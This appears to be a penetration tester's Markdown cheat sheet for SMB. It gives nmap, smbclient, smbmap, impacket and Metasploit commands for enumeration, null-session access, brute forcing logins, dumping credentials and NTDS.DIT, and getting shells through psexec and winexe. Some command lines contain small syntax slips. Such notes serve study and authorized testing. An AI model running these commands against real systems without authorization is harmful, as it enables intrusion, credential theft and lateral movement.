# Server Message Block (SMB)

Ports:
- 137 UDP - SMB over NetBIOS (Name Services).
- 138 UDP - SMB over NetBIOS (datagram)
- 139 TCP - SMB over NetBIOS (session service)
- 445 TCP - SMB without NetBIOS

Application:
Version:
Domain/workgroup name:
Domain-sid:
Allows unauthenticated login:


----------------------------------------------------------------------------------------

Basics:
https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/
https://www.youtube.com/watch?v=4_QXSIF16lw
Security:
https://www.youtube.com/watch?v=DsSEknNGOr8&list=PLyOlunpO5LG1W1SgFGDUAlCTSz9j9zBax&index=3


--------------------------------------------------------------------------

## Discovery scans

- Query the NetBIOS name service for valid NetBIOS names
     
      sudo nbtscan -r $TARGET_NETWORK

- nmap netbios scan (safe)

      sudo nmap -sU -p 137,138,139 --script nbstat.nse,nbns-interfaces $TARGET_IP -oN "$WORKING_DIRECTORY""$TARGET_IP"nmap_137u_138u_139u_discovery_safe

- nmap discovery scan (safe)
 
      sudo nmap -p 445 --script="(safe and discovery) and smb*" $TARGET_IP -oN "$WORKING_DIRECTORY""$TARGET_IP"nmap_445_discovery_safe
 
- nmap discovery scan (intrusive)

      sudo nmap -p 445 --script "(discovery or auth) and smb*" $TARGET_IP -oN "$WORKING_DIRECTORY"nmap_"$TARGET_IP"_445_discovery_full

- nmap authenticated discovery scan (intrusive)
      
      sudo nmap -p 445 --script "(discovery or auth) and smb*" --script-args smbusername=<smb_username>,smbpassword=<smb_password> $TARGET_IP -oN "$WORKING_DIRECTORY"nmap_"$TARGET_IP"_445_discovery_auth

- Other Tools
  
  [enum4linux](../Tools/enum4linux.md)
  [rpcclient](../Tools/rpcclient.md)  

--------------------------------------------------------------------------

## Vuln Scans

- nmap vuln scan (safe)

      sudo nmap -p 445 --script "vuln and safe and (vulners or smb*)" $TARGET_IP -oN "$WORKING_DIRECTORY""$TARGET_IP"nmap_445_vuln_safe

- nmap vuln scan (intrusive)

      sudo nmap -p 445 --script="(vuln and intrusive) and smb*" $TARGET_IP -oN "$WORKING_DIRECTORY""$TARGET_IP"nmap_445_vuln_intrusive

--------------------------------------------------------------------------

## Enumerate Version

- Check for EternalBlue vulnerability (SMBv1)

      sudo nmap --script smb-protocols -p445 $TARGET_IP -oN "$WORKING_DIRECTORY""$TARGET_IP"nmap_445_smb-protocols
    
- Other Tools

  [msfconsole](../Tools/Metasploit/msfconsole.md)

--------------------------------------------------------------------------

## Enumerate Shares

 - Unauthenticated
 
       sudo nmap --script smb-enum-shares,smb-ls -p 445 $TARGET_IP -oN "$WORKING_DIRECTORY""$TARGET_IP"nmap_445_smb-enum-shares_guest

- Authenticated

        sudo nmap -p 445 --script smb-enum-shares,smb-ls --script-args smbusername=<smb_username>,smbpassword=<smb_password> $TARGET_IP -oN "$WORKING_DIRECTORY""$TARGET_IP"nmap_445_smb-enum-shares_auth

- Other Tools

  [enum4linux](../Tools/enum4linux.md)
  [smbclient](../Tools/smbclient.md)
  [smbmap](../Tools/smbmap.md)
  [msfconsole](../Tools/Metasploit/msfconsole.md)

--------------------------------------------------------------------------

## Enumerate Users/Logins

- Check for Null session support (IPC share?)

      smbclient -L $TARGET_IP -N

  Null session is allowed if shares a listed without requiring password

- Check for guest account

      sudo nmap --script smb-security-mode -p 445 $TARGET_IP -oN "$WORKING_DIRECTORY""$TARGET_IP"nmap_445_smb-security-mode

- List Users

    - Unauthenticated
    
          sudo nmap --script smb-enum-users -p 445 $TARGET_IP -oN "$WORKING_DIRECTORY""$TARGET_IP"nmap_445_smb-enum-users_guest

    - Authenticated

          sudo nmap -p 445 --script smb-enum-users --script-args smbusername=<smb_username>,smbpassword=<smb_password> $TARGET_IP -oN "$WORKING_DIRECTORY""$TARGET_IP"nmap_445_smb-enum-users_auth

- nmap brute force

      sudo nmap -p 445 --script="brute and smb*" $TARGET_IP -oN "$WORKING_DIRECTORY""$TARGET_IP"nmap_445_brute

- See Also:

[enum4linux](../Tools/enum4linux.md)
[rpcclient](../Tools/rpcclient.md)
[hydra](../Tools/hydra.md)
[msfconsole](../Tools/Metasploit/msfconsole.md)

--------------------------------------------------------------------------

## Connect to share

- Connect to a share with Null session

      smbclient -N \\\\$TARGET_IP\\<target_share> # option 1
      smbmap -H $TARGET_IP                        # option 2
      smbmap -u "" -H $TARGET_IP                  # option 3

- Check permissions on a connected share

    - enable acl listing

          smb: \> showacls

    - list directories with acls 

          smb: \> dir

- Mount share on local machine

      mount -t cifs //10.10.10.134/SHARENAME ~/path/to/mount_directory

- wineexe log in with shell

      winexe -U username // "cmd.exe" --system

- Other Tools:

  [smbclient](../Tools/smbclient.md)
  [smbmap](../Tools/smbmap.md)

--------------------------------------------------------------------------

## View/Modify Files

- Recursively list all files in share

    - All shares
      
          smbmap -H $TARGET_IP
      
    - Specific share
      
          smbmap -r <REMOTE_PATH> -H $TARGET_IP

- Interesting files:

    - NTDS.DIT
        - Contains local Active Directory database where all directories are stored.
        - Contains all Active Directory credentials.
        - Often obtainable if SMB vulnerabilities are present on the system.

- Upload / Download specific files

      smbmap -H $TARGET_IP --download '<REMOTE_PATH>'              # option 1
      smbmap -H $TARGET_IP --upload '<LOCAL_PATH>' '<REMOTE_PATH>' # option 2
      smb: \> get <TARGET_FILE>                                    # option 3

- Recursively download all files

      smbclient //$TARGET_IP/Replication

  ```
  smb: \> recurse ON\
  smb: \> prompt OFF\
  smb: \> mget *
  ```

- Other Tools

  [smbmap](../Tools/smbmap.md)

--------------------------------------------------------------------------

## Get secrets (hashes, plaintext credentials, keys, etc)

- impacket

  /usr/share/doc/python3-impacket/examples/secretsdump.py
  https://medium.com/@benichmt1/secretsdump-demystified-bfd0f933dd9b 

      python3 secretsdump.py [[domain/]username[:password]@]<targetname or address>

  or

      python3 secretsdump.py LOCAL

  What we would be looking for is a misconfigured service that was set as domain admin. From here, we could use those credentials and Impacket’s **crackmapexec.py** script with the option **rid-brute** or **GetADUsers.py** script to query the Domain Controller and obtain all the usernames and hashes on the network. We would then run the script against the list of usernames/hashes to grab as many credentials as possible. 

--------------------------------------------------------------------------

## Get shell with admin credentials/hash

- psexec

    - https://book.hacktricks.xyz/windows-hardening/lateral-movement/psexec-and-winexec
    - https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/
    - https://github.com/mertdas/SharpLateral ?

- See also
  [Metasploit](#Metasploit)

--------------------------------------------------------------------------

## Lateral Movement with Windows SMB Shares

- The following video explains how an attacker can exploit SMB Admin 
Shares in order to gain access to other systems on the network: 

  https://www.youtube.com/watch?v=41MUhlHGZ4E 

--------------------------------------------------------------------------

## Windows
#windows

- List domains, resources, and computers belonging to a given host

      net view \\<netbios_name> /all

- Connect to share

      net use <drive_letter \\<target_ip>\<target_share> <password> /user:<username>

    - Ex:

          net use Z: \\10.4.16.53\c$ smbserver_771 /user:administrator

- Disconnect from shares

      net use * /delete

--------------------------------------------------------------------------

## Metasploit

Modules

- Check SMB version

      auxiliary/scanner/smb/smb_version

- Check SMB2 support

      auxiliary/scanner/smb/smb2

- Enumerate users

      auxiliary/scanner/smb/smb_enumusers

- Brute force logins

      auxiliary/scanner/smb/smb_login

- Enumerate shares

      auxiliary/scanner/smb/smb_enumshares

- Enumerate named pipes

      auxiliary/scanner/smb/pipe_auditor

- Get shell with psexec (using admin credentials/hash)

      exploit/windows/smb/psexec
      set smbpass <plaintext pass/hash>

- More Info

  [msfconsole](../Tools/Metasploit/msfconsole.md)  

--------------------------------------------------------------------------
## Tools

[nmap](../Tools/nmap.md)
[enum4linux](../Tools/enum4linux.md)
[rpcclient](../Tools/rpcclient.md)
[smbclient](../Tools/smbclient.md)
[smbmap](../Tools/smbmap.md)
[msfconsole](../Tools/Metasploit/msfconsole.md)